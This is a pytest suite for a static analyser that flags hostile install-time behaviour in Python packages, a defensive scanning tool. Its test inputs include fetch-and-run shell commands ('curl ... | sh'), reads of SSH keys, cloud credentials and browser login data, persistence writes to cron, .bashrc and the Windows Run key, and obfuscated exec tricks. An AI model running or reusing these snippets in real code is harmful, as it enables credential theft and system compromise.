import base64
import hashlib
import sys
import time

import pytest

from buckthorn.code import analyse, imported_functions, not_run_by_pip, reaches_setup_py


def _kinds(source: str, top_level_only: bool = False) -> list[str]:
    return sorted({hit.kind for hit in analyse(source, top_level_only)})


@pytest.mark.parametrize(
    "source",
    [
        "import urllib.request\nurllib.request.urlopen('http://x')",
        "from urllib.request import urlopen as u\nu('http://x')",
        "import requests\nrequests.post('http://x', data=1)",
        "import socket\ns = socket.socket()\ns.connect(('x', 1))",
        "import socket\nsocket.socket().connect(('x', 1))",
        "from socket import socket as S\nconn = S()\nconn.sendto(b'x', ('h', 1))",
        "import socket\nsocket.create_connection(('x', 1))",
        "import socket\nsocket.gethostbyname('a.b')",
        "__import__('requests').get('http://x')",
        "import http.client\nc = http.client.HTTPSConnection('x')\nc.request('GET', '/')",
        # a request made through a client object
        "import requests\nrequests.Session().get('http://x')",
        "import urllib3\npm = urllib3.PoolManager()\npm.request('GET', 'http://x')",
        "import httpx\nwith httpx.Client() as c:\n    c.post('http://x')",
        "from aiohttp import ClientSession\nasync def f():\n    async with ClientSession() as s:\n"
        "        await s.get('http://x')",
        "import urllib.request\nurllib.request.build_opener(h).open('http://x')",
        "from urllib.request import build_opener\nopener = build_opener()\nopener.open('http://x')",
    ],
)
def test_network(source):
    assert _kinds(source) == ["network"]


@pytest.mark.parametrize(
    "source",
    [
        "import subprocess\nsubprocess.run(['ls'])",
        "import subprocess as sp\nsp.Popen('x')",
        "from subprocess import check_output\ncheck_output('x')",
        "import os\nos.system('x')",
        "from os import popen\npopen('x')",
        "import os\nos.execv('/bin/sh', [])",
    ],
)
def test_process(source):
    assert _kinds(source) == ["process"]


@pytest.mark.parametrize(
    "source", ["exec(x)", "eval(x)", "compile(x, 'f', 'exec')", "import builtins\nbuiltins.exec(x)"]
)
def test_exec(source):
    assert _kinds(source) == ["exec"]


@pytest.mark.parametrize(
    "source",
    [
        "exec(open('pkg/version.py').read())",
        "exec(compile(open('v.py').read(), 'v.py', 'exec'))",
        "from pathlib import Path\nexec(Path('v.py').read_text())",
        # the same trick as top-1000 PyPI packages write it
        "with open('pkg/__init__.py') as f:\n    ns = {}\n    exec(f.read(), ns)",
        "import os\nroot = os.path.dirname(os.path.abspath(__file__))\n"
        "with open(os.path.join(root, 'pkg', 'about.py')) as f:\n    exec(f.read(), {})",
        "import os\nfrom pathlib import Path\nhere = os.path.dirname(os.path.realpath(__file__))\n"
        "exec(Path(os.path.join(here, 'pkg', 'release.py')).read_text())",
        "import pathlib\nroot = pathlib.Path(__file__).parent\n"
        "exec((root / 'src' / 'pkg' / 'version.py').read_text(encoding='utf-8'))",
        # the path held in a name bound once (firebase_admin, py4j, pathvalidate, spacy)
        "from os import path\nabout_path = path.join(path.dirname(path.abspath(__file__)), "
        "'pkg', '__about__.py')\nwith open(about_path) as fp:\n    exec(fp.read(), {})",
        "import os\nVERSION_PATH = os.path.join('src', 'pkg', 'version.py')\n"
        "exec(compile(open(VERSION_PATH).read(), VERSION_PATH, 'exec'))",
        "import os\nMODULE_NAME = 'pkg'\n"
        "with open(os.path.join(MODULE_NAME, '__version__.py')) as f:\n    exec(f.read(), {})",
        "from pathlib import Path\nPACKAGE_ROOT = Path(__file__).parent / 'pkg'\n"
        "with (PACKAGE_ROOT / 'about.py').open('r') as f:\n    exec(f.read(), {})",
        # Path with several parts (respx, xxhash)
        "from pathlib import Path\nexec(Path('pkg', '__version__.py').read_text(), {})",
        # f is also the README handle elsewhere: the enclosing with decides (tornado, blis)
        "with open('README.md') as f:\n    long = f.read()\n"
        "with open('pkg/__init__.py') as f:\n    ns = {}\n    exec(f.read(), ns)",
    ],
)
def test_exec_of_a_local_file_read_is_not_flagged(source):
    # The usual setup.py version trick. Not exec: the caller reads that file instead.
    assert _kinds(source) == ["exec_file"]


def test_exec_of_a_joined_local_file_names_the_path():
    source = (
        "import os\nroot = os.path.dirname(os.path.abspath(__file__))\n"
        "with open(os.path.join(root, 'pkg', 'about.py')) as f:\n    exec(f.read(), {})"
    )
    hits = analyse(source, False)
    assert [(h.kind, h.detail) for h in hits] == [("exec_file", "pkg/about.py")]


@pytest.mark.parametrize(
    "source",
    [
        # a folder that is not this file's own: the file may be written at run time
        "import os, tempfile\nexec(open(os.path.join(tempfile.gettempdir(), 'x.py')).read())",
        "import os\nup = os.path.dirname(os.path.dirname(__file__))\n"
        "exec(open(os.path.join(up, 'x.py')).read())",
        "with open(name) as f:\n    exec(f.read())",
        # a safe-looking binding cannot vouch for another binding of the same name
        "with open('pkg/v.py') as f:\n    pass\nf = get(u)\nexec(f.read())",
        "with open('pkg/v.py') as f:\n    f = get(u)\n    exec(f.read())",
        # a later absolute part wins in os.path.join, so this is not the local file
        "import os\nhere = os.path.dirname(__file__)\n"
        "exec(open(os.path.join(here, '/tmp/x.py')).read())",
        "exec(open('/tmp/p').read())",
        "exec(open('C:\\\\Temp\\\\p.py').read())",
        # a path name bound twice is not trusted
        "import os\nP = 'pkg/v.py'\nP = get()\nexec(open(P).read())",
        "with open('pkg/v.py') as f:\n    pass\ndef g(f):\n    exec(f.read())",
        "import os\nroot = os.path.dirname(__file__)\nroot = '/tmp'\n"
        "exec(open(os.path.join(root, 'x.py')).read())",
    ],
)
def test_exec_of_a_file_outside_this_folder_counts(source):
    assert _kinds(source) == ["exec"]


@pytest.mark.parametrize(
    "source",
    [
        "open(os.path.expanduser('~/.ssh/id_rsa'))",
        "open('/home/u/.aws/credentials')",
        "shutil.copytree(os.path.join(home, '.ssh'), dst)",
        "Path(home + '/.config/gcloud/credentials.db').read_bytes()",
        "expanduser('~/.git-credentials')",
        "shutil.copy(base + 'Google/Chrome/Default/Login Data', tmp)",
    ],
)
def test_secret_paths(source):
    assert _kinds(source) == ["secrets"]


@pytest.mark.parametrize(
    "source",
    [
        "import os\nd = dict(os.environ)",
        "import os\nfor k in os.environ: pass",
        "import os\nitems = os.environ.items()",
        "import os, json\njson.dumps(os.environ.copy())",
    ],
)
def test_bulk_environ(source):
    assert _kinds(source) == ["environ"]


@pytest.mark.parametrize(
    "source",
    [
        "import os\nos.environ.get('HOME')",
        "import os\nos.environ['PATH']",
        "import os\n'CI' in os.environ",
        "import os, subprocess\nsubprocess.run(['x'], env=dict(os.environ, A='1'))",
    ],
)
def test_ordinary_environ_use_is_not_bulk(source):
    assert "environ" not in _kinds(source)


@pytest.mark.parametrize(
    "source",
    [
        "open(os.path.expanduser('~/.bashrc'), 'a')",
        "write(expanduser('~/Library/LaunchAgents/com.x.plist'))",
        "open('/etc/cron.d/x', 'w')",
        r"winreg.OpenKey(h, r'Software\Microsoft\Windows\CurrentVersion\Run')",
    ],
)
def test_persistence(source):
    assert _kinds(source) == ["persistence"]


@pytest.mark.parametrize(
    "source",
    [
        # botocore's shape: build the path at import, open it later.
        "import os\nCACHE = os.path.expanduser(os.path.join('~', '.aws', 'sso', 'cache'))",
        "from pathlib import Path\nP = Path('~/.aws/config')",
        "import os\nHAS = os.path.exists(os.path.expanduser('~/.netrc'))",
    ],
)
def test_building_or_checking_a_path_is_not_a_read(source):
    assert _kinds(source) == []


def test_a_path_held_in_a_constant_is_not_a_read():
    # botocore and friends name ~/.aws/config at module level and open it later.
    assert _kinds("DEFAULT = '~/.aws/config'\nRC = '~/.bashrc'") == []


@pytest.mark.parametrize(
    "source",
    [
        # lanternkb 0.1.3: folder names to skip, held in a set at import.
        "SKIP = frozenset({'LaunchAgents', '.ssh', 'node_modules'})",
        "SKIP = set(['LaunchAgents'])\nPATHS = tuple(['~/.bashrc'])\nL = list(('~/.aws',))",
        "D = dict(agents='~/Library/LaunchAgents')",
    ],
)
def test_a_path_held_in_a_collection_is_not_a_read(source):
    assert _kinds(source, top_level_only=True) == []


def test_a_path_in_a_collection_passed_on_still_counts():
    assert _kinds("import os\nos.listdir(list(['~/Library/LaunchAgents']))") == ["persistence"]


def test_ordinary_strings_are_quiet():
    assert _kinds("s = 'see .profile docs at https://example.com/aws'\nx = 'myssh'") == []


def test_top_level_only_skips_function_bodies():
    source = "import subprocess\ndef f():\n    subprocess.run('x')\nclass C:\n    exec(x)\n"
    assert _kinds(source, top_level_only=True) == ["exec"]
    assert _kinds(source) == ["exec", "process"]


def test_top_level_includes_if_try_and_with_blocks():
    source = "import os\nif True:\n try:\n  os.system('x')\n except OSError:\n  pass\n"
    assert _kinds(source, top_level_only=True) == ["process"]


def test_hits_carry_line_numbers():
    hits = analyse("x = 1\nimport os\nos.system('x')\n", False)
    assert [(h.kind, h.line) for h in hits] == [("process", 3)]


def test_syntax_error_raises():
    with pytest.raises(SyntaxError):
        analyse("def (:\n", False)


@pytest.mark.parametrize(
    "source",
    [
        "import os\nos.system('curl -s http://x/a.sh | sh')",
        "import subprocess\nsubprocess.run(['wget', '-q', 'x'])",
        "import subprocess\nsubprocess.Popen('powershell -c iwr x', shell=True)",
        "import os\nos.system(f'python -c \"import urllib\" https://{host}/x')",
    ],
)
def test_process_that_fetches_is_also_network(source):
    assert _kinds(source) == ["network", "process"]


def test_compiler_probe_is_only_process():
    assert _kinds("import subprocess\nsubprocess.check_output(['cc', '--version'])") == ["process"]


@pytest.mark.parametrize(
    "source",
    [
        "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))",
        "import zlib, base64\nexec(zlib.decompress(base64.b64decode(blob)))",
        "import marshal\nexec(marshal.loads(data))",
        "import codecs\nexec(codecs.decode('cevag(1)', 'rot13'))",
        "exec(bytes.fromhex('7072696e74283129'))",
        "exec('1)(tnirp'[::-1])",
        "exec(''.join(chr(c ^ 42) for c in data))",
        "from base64 import b64decode as d\neval(d(x))",
        "import builtins\ngetattr(builtins, 'exec')(code)",
        "getattr(__builtins__, 'eval')(code)",
    ],
)
def test_hidden_code(source):
    assert "hidden" in _kinds(source)


def test_hidden_code_counts_inside_functions_even_at_import():
    source = "import base64\ndef f():\n    exec(base64.b64decode(x))\n"
    assert _kinds(source, top_level_only=True) == ["hidden"]


def test_decoding_data_without_exec_is_not_hidden():
    assert _kinds("import base64\nicon = base64.b64decode('iVBORw0KGgo=')") == []


def test_long_encoded_literal_fed_to_a_decoder():
    blob = base64.b64encode(hashlib.sha512(b"seed").digest() * 12).decode()
    assert _kinds(f"import base64\nx = base64.b64decode('{blob}')") == ["encoded"]


def test_long_hex_literal_fed_to_a_decoder():
    blob = (hashlib.sha512(b"seed").digest() * 6).hex()
    assert _kinds(f"x = bytes.fromhex('{blob}')") == ["encoded"]


def test_long_prose_is_not_encoded():
    prose = "The quick brown fox jumps over the lazy dog. " * 30
    assert _kinds(f"import codecs\nx = codecs.decode('{prose}', 'rot13')") == []


def test_short_or_low_entropy_literals_are_not_encoded():
    assert _kinds("import base64\nx = base64.b64decode('QUJD')") == []
    assert _kinds(f"import base64\nx = base64.b64decode('{'A' * 2000}')") == []


def test_exec_of_a_named_local_file_is_reported_for_follow_up():
    hits = analyse("exec(open('src/pkg/_version.py').read())", False)
    assert [(h.kind, h.detail) for h in hits] == [("exec_file", "src/pkg/_version.py")]


@pytest.mark.parametrize(
    "test",
    [
        "__name__ == '__main__'",
        "'__main__' == __name__",
        "sys.platform != 'win32' and __name__ == '__main__'",
    ],
)
def test_main_block_does_not_run_on_import(test):
    source = f"import os\nif {test}:\n    os.system('x')\nelse:\n    exec(y)\n"
    assert _kinds(source, top_level_only=True) == ["exec"]
    assert _kinds(source) == ["exec", "process"]


def test_exec_of_a_string_literal_is_read_as_code():
    # anyio compiles a literal at import: the code is right there, so read it.
    assert _kinds("_f = compile('import pickle\\nx = 1\\n', '<x>', 'exec')") == []
    hits = analyse("x = 1\nexec('import os\\nos.system(\"id\")')\n", True)
    assert [(h.kind, h.line) for h in hits] == [("process", 2)]


def test_string_literal_that_will_not_parse_is_still_exec():
    assert _kinds("exec('this is not python (')") == ["exec"]


def test_making_a_socket_without_using_it_is_not_network():
    # dill builds a catalogue of object types at import, a socket among them.
    assert _kinds("import socket\nx = {}\nx['SocketType'] = _s = socket.socket()") == []


# Before 3.12 the parser itself stops at the default recursion limit, and raising
# the limit for it can crash the interpreter on deeper code. So 3.11 leaves such
# files unread (not_verified) instead.
PARSES_DEEP = pytest.mark.skipif(sys.version_info < (3, 12), reason="3.12+ parser")


@PARSES_DEEP
def test_deeply_nested_code_is_read(recwarn):
    # sympy ships a file nested deeper than the default recursion limit.
    assert _kinds("x = " + "1 + " * 5000 + "1\nimport os\nos.system('x')") == ["process"]
    deep = "x = " + "1 + " * 5000 + "1\nimport os\ndef f():\n    os.system('x')\nf()\n"
    assert _kinds(deep, top_level_only=True) == ["process"]


@PARSES_DEEP
def test_long_attribute_chains_do_not_hide_imports():
    # A chain past the default recursion limit must not switch the import map off.
    source = "x = a" + ".b" * 3000 + "()\nfrom main import main\nmain()\n"
    assert imported_functions(source)["main"] == {"main": "called at install"}


@pytest.mark.skipif(sys.version_info >= (3, 12), reason="3.11 parser")
def test_deep_code_fails_closed_on_3_11():
    with pytest.raises(RecursionError):
        analyse("x = " + "1 + " * 5000 + "1\n", True)


def test_syntax_warnings_from_the_code_read_are_not_printed(recwarn):
    analyse("x = '\\d'\n", True)
    assert not [w for w in recwarn if issubclass(w.category, SyntaxWarning)]


# Code that module-level code calls, or hands to a thread, runs on import too.
# Shapes from the DataDog corpus: kube-health-tools, lightning, telnyx, mistralai.
@pytest.mark.parametrize(
    ("source", "kinds"),
    [
        (
            "import threading, urllib.request\n"
            "def _go():\n    urllib.request.urlretrieve(u, p)\n"
            "threading.Thread(target=_go, daemon=True).start()\n",
            ["network"],
        ),
        (
            "import subprocess\ndef _run_background_task():\n    subprocess.Popen(['x'])\n"
            "_run_background_task()\n",
            ["process"],
        ),
        (  # through a second same-module function
            "import os\ndef inner():\n    os.system('x')\ndef outer():\n    inner()\nouter()\n",
            ["process"],
        ),
        (  # every definition of a name is read: either may be the one that runs
            "import os\nif os.name == 'nt':\n    def go():\n        os.system('x')\n"
            "else:\n    def go():\n        pass\ngo()\n",
            ["process"],
        ),
        (  # defined under match
            "import os, sys\nmatch sys.platform:\n    case 'linux':\n"
            "        def go():\n            os.system('x')\ngo()\n",
            ["process"],
        ),
        (  # a lambda thread target runs what it calls (data-pipeline-check)
            "import threading, requests\ndef _report():\n    requests.post(u)\n"
            "threading.Thread(target=lambda: (time.sleep(3), _report())).start()\n",
            ["network"],
        ),
        (  # atexit runs it
            "import atexit, requests\ndef bye():\n    requests.post(u)\natexit.register(bye)\n",
            ["network"],
        ),
        (  # a timer thread runs it
            "import threading, os\ndef go():\n    os.system('x')\nthreading.Timer(5, go).start()\n",
            ["process"],
        ),
        (
            "from threading import Timer\nimport os\ndef go():\n    os.system('x')\n"
            "Timer(interval=5, function=go).start()\n",
            ["process"],
        ),
        (  # a nested function the running function hands to a thread (odoo-addon-spp-base)
            "import os, threading\ndef run():\n    def _run():\n        os.system('x')\n"
            "    threading.Thread(target=_run).start()\nrun()\n",
            ["process"],
        ),
        (  # applying a decorator calls it, as @deco(...) does
            "import os\ndef deco(fn):\n    os.system('x')\n    return fn\n"
            "@deco\ndef g():\n    pass\n",
            ["process"],
        ),
    ],
)
def test_functions_called_at_module_level_count_at_import(source, kinds):
    assert _kinds(source, top_level_only=True) == kinds


@pytest.mark.parametrize(
    "source",
    [
        # only defined, or only referenced as a value
        "import os\ndef f():\n    os.system('x')\n",
        "import os\ndef f():\n    os.system('x')\nhandlers = {'f': f}\n",
        # called only when run as a script
        "import os\ndef main():\n    os.system('x')\nif __name__ == '__main__':\n    main()\n",
        # called from a function nobody calls
        "import os\ndef f():\n    os.system('x')\ndef g():\n    f()\n",
        # a method that shares the name is not the module-level function
        "import os\nclass C:\n    def f(self):\n        os.system('x')\ndef f():\n    pass\nf()\n",
        # wrapped or registered, not called (fsspec, jsonschema, jaraco.context)
        "import requests\ndef f():\n    requests.get(u)\nfile_size = sync_wrapper(f)\n",
        "import requests\ndef f(uri):\n    requests.get(uri)\nREG = Registry(retrieve=f)\n",
        # applying a decorator runs it, not the wrapper it returns
        "import os\ndef deco(fn):\n    def wrapper():\n        os.system('x')\n"
        "    return wrapper\n@deco\ndef g():\n    pass\n",
        # a nested function is seen only from inside its function
        "import os\ndef a():\n    def helper():\n        os.system('x')\n    return helper\n"
        "def helper():\n    pass\na()\nhelper()\n",
        # a nested function the running function only defines
        "import os\ndef run():\n    def _run():\n        os.system('x')\n    return _run\nrun()\n",
        # timeit.Timer only stores what it is given
        "import os, timeit\ndef go():\n    os.system('x')\nt = timeit.Timer(go, go)\n",
        # exec in a helper runs the caller's code, not code of its own (six.exec_)
        "def exec_(code, globs=None):\n    exec(code, globs)\nexec_('def reraise(tp): raise tp')\n",
    ],
)
def test_functions_not_called_at_module_level_do_not_count(source):
    assert _kinds(source, top_level_only=True) == []


def test_called_function_hit_names_the_function():
    source = "import os\ndef _go():\n    os.system('x')\n_go()\n"
    (hit,) = analyse(source, True)
    assert (hit.line, hit.detail) == (3, "calls os.system (in _go(), called at module level)")


def test_entry_functions_count_as_called():
    """setup.py may call a function of a local module: the caller names it."""
    source = "import urllib.request\ndef main():\n    urllib.request.urlopen(u)\n"
    assert _kinds(source, top_level_only=True) == []
    hits = analyse(source, True, entry={"main": "called at install"})
    assert [(h.kind, h.detail) for h in hits] == [
        ("network", "calls urllib.request.urlopen (in main(), called at install)")
    ]


@pytest.mark.parametrize(
    "source",
    [
        # BlankOBF: eval("eval") hands back eval under another name
        '_____ = eval("\\145\\166\\141\\154")\n_____(payload)\n',
        "f = eval('__import__')\n",
        "g = eval(' exec ')\n",
    ],
)
def test_eval_of_a_builtin_name_is_hidden(source):
    assert "hidden" in _kinds(source, top_level_only=True)


def test_eval_of_an_ordinary_literal_is_read_in_place():
    assert _kinds("x = eval('1 + 1')\n", top_level_only=True) == []


@PARSES_DEEP
def test_setup_py_readers_are_linear_in_long_chains_and_many_names():
    chain = "x = a" + ".sys.argv" * 1_500 + "\n"
    names = "".join(f"d{i} = {{'k': 1}}\nf(**d{i})\n" for i in range(20_000))
    start = time.monotonic()
    for source in (chain, names):
        reaches_setup_py(source)
        not_run_by_pip("from setuptools import setup\n" + source + "setup()\n")
    assert time.monotonic() - start < 20


def test_long_method_chains_are_read_in_linear_time():
    # nltk's Snowball stemmer chains .replace() dozens of times; resolving each
    # call's function twice made this exponential and hung the scan.
    source = "w = w" + ".replace('a', 'b')" * 60 + "\nimport os\nos.system('x')\n"
    assert _kinds(source, top_level_only=True) == ["process"]


@pytest.mark.parametrize(
    "source",
    [
        # building a client connects nothing (sentry_sdk, posthog, courlan at import)
        "import urllib3\nhttp = urllib3.PoolManager(num_pools=2)\n",
        "import requests\nsession = requests.Session()\nsession.headers.update({'a': 'b'})\n",
        "import httpx\nclient = httpx.Client(timeout=5)\nclient.close()\n",
        "import http.client\nconn = http.client.HTTPSConnection('x')\n",
        "import urllib.request\nopener = urllib.request.build_opener(h)\nopener.add_handler(h)\n",
    ],
)
def test_building_a_client_is_not_network(source):
    assert _kinds(source, top_level_only=True) == []


@pytest.mark.parametrize(
    "source",
    [
        # a default value, a URL pattern, a built path, a class name (top-1000 PyPI)
        "import os\nLOC = os.environ.get('KUBECONFIG', '~/.kube/config')\n",
        "import os\nLOC = os.getenv('KUBECONFIG', '~/.kube/config')\n",
        'import re\nP = re.compile("https?://dsql\\\\.(.+)\\\\.api\\\\.aws")\n',
        "from pathlib import Path\nF = [str(Path('~/.ssh/config').expanduser())]\n",
        "import proto\nM = proto.module(manifest={'CrontabSpec'})\n",
    ],
)
def test_strings_that_only_name_a_path_are_not_reads(source):
    assert _kinds(source, top_level_only=True) == []


@pytest.mark.parametrize(
    "source",
    [
        "from pathlib import Path\nPath('~/.ssh/id_rsa').expanduser().read_text()\n",
        "import subprocess\nsubprocess.run('echo x | crontab -', shell=True)\n",
        "open('/etc/crontab', 'a').write('x')\n",
    ],
)
def test_reads_and_writes_of_those_paths_still_count(source):
    assert set(_kinds(source, top_level_only=True)) & {"secrets", "persistence"}


def test_path_with_several_parts_names_the_file():
    hits = analyse(
        "from pathlib import Path\nexec(Path('pkg', '__version__.py').read_text())", False
    )
    assert [(h.kind, h.detail) for h in hits] == [("exec_file", "pkg/__version__.py")]


@pytest.mark.parametrize(
    "source",
    [
        # pip run from install code (the 2022 IsUserAnAdmin campaign)
        "import pip\npip.main(['install', 'pypiwin32'])",
        "from pip._internal import main\nmain(['install', 'pypiwin32'])",
    ],
)
def test_running_pip_is_a_process(source):
    assert _kinds(source) == ["process"]


@pytest.mark.parametrize(
    "source",
    [
        # a builtin reached by a name built at run time (same campaign)
        "f = getattr(__builtins__, oct.__str__()[-3] + hex.__str__()[-4] + 'r')\n",
        "import builtins\nf = getattr(builtins, ''.join(parts))\n",
        # trimming a literal or an assembled name is still assembling it
        "import builtins\nf = getattr(builtins, ' EXEC '.strip().lower())\n",
        "import builtins\n_N = chr(1) + chr(2)\nf = getattr(builtins, _N.removeprefix('x'))\n",
    ],
)
def test_builtin_by_computed_name_is_hidden(source):
    assert _kinds(source, top_level_only=True) == ["hidden"]


@pytest.mark.parametrize(
    "source",
    [
        # the name assembled into a variable bound once, then used inside a function
        "import builtins\n_N = ''.join(chr(c) for c in (112, 114, 105, 110, 116))\n"
        "def go(code):\n    getattr(builtins, _N)(code)\n",
        "import builtins as b\n_N = chr(112) + chr(114)\n_M = _N\ndef go():\n    getattr(b, _M)\n",
        "import builtins\n_N: str = f'{chr(112)}rint'\nf = getattr(builtins, _N)\n",
        "import base64, builtins\n_N = base64.b64decode('cHJpbnQ=').decode()\n"
        "f = getattr(builtins, _N)\n",
        # found by review: literals spread over names, a lambda, operator, a builtin alias
        "import builtins\n_A = 'pr'\n_N = _A + 'int'\nf = getattr(builtins, _N)\n",
        "import builtins\n_K = [112, 114]\n_N = ''.join(map(chr, _K))\nf = getattr(builtins, _N)\n",
        "import builtins\n_A = 'PR'\n_N = (_A + 'INT').lower()\nf = getattr(builtins, _N)\n",
        "import builtins\n_N = (lambda c: ''.join(map(chr, c)))([112])\n"
        "f = getattr(builtins, _N)\n",
        "import builtins, operator\n_N = operator.add('pr', 'int')\nf = getattr(builtins, _N)\n",
        "import builtins\nc = chr\n_N = c(112) + c(114)\nf = getattr(builtins, _N)\n",
        # a builtin's name held in a variable bound once to it
        "_N = 'exec'\ngetattr(__builtins__, _N)(code)\n",
    ],
)
def test_builtin_by_a_name_held_in_a_variable_is_hidden(source):
    assert _kinds(source, top_level_only=True) == ["hidden"]


@pytest.mark.parametrize(
    "source",
    ["x = x.strip()\n", "x = b.lower()\nb = x.strip()\n", "x = x\n"],
)
def test_a_name_bound_to_itself_ends(source):
    # Found by review: following x = x.strip() looped forever.
    assert _kinds("import builtins\n" + source + "getattr(builtins, x)\n", True) == []


@pytest.mark.parametrize(
    "value",
    # a value looked up, not built from literals (sphinx's builtin_resolver)
    ["node.get('reftarget')", "f'{prefix}{name}'", "parts[0] + suffix", "cfg['name'].lower()"],
)
def test_a_name_held_from_a_lookup_is_not_hidden(value):
    source = f"import builtins\nt = {value}\nok = getattr(builtins, t, None)\n"
    assert _kinds(source, True) == []


def test_a_name_bound_more_than_once_is_not_followed():
    source = "import builtins\nname = chr(1) + chr(2)\nname = other\nf = getattr(builtins, name)\n"
    assert _kinds(source, True) == []


@pytest.mark.parametrize(
    "source",
    [
        "import builtins\nf = getattr(builtins, 'print')\n",
        # a name held in a variable or attribute: introspection (numpy, pytest, hypothesis)
        "import builtins\nf = getattr(builtins, name, None)\n",
        "import builtins\nf = getattr(builtins, thing.__forward_arg__)\n",
        "import builtins\nf = getattr(builtins, t if t != 'unicode' else 'str')\n",
        # a plain variable trimmed or recased is still that variable (flake8-bugbear)
        "import builtins\n"
        "x = [getattr(builtins, n.removeprefix('builtins.'), type) for n in names]\n",
        "import builtins\nf = getattr(builtins, node.id.strip().lower())\n",
    ],
)
def test_builtin_by_a_plain_name_is_not_hidden(source):
    assert _kinds(source, True) == []
